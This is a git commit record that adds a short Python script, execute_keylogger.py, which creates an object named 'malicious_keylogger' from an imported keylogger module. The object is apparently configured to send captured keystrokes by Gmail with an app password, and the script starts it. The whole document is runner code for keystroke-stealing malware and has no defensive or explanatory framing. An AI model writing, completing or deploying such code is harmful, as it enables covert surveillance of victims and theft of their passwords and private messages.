693dd5b8803b04a322dadf42ccd7de6fc55ce3e7
Prajwalll14 <prajwalbabangol@gmail.com>
2024-09-26 21:52:01 +0530

    Create execute_keylogger.py

---
+++ execute_keylogger.py
@@ -0,0 +1,15 @@
+#!/usr/bin/env python
+
+import keylogger
+
+
+#
+# Initialize / create keylogger
+import keylogger
+
+
+malicious_keylogger: keylogger.KeyLogger = keylogger.KeyLogger(60,'gmail','app password')
+
+# Execute Keylogger
+
+malicious_keylogger.start()
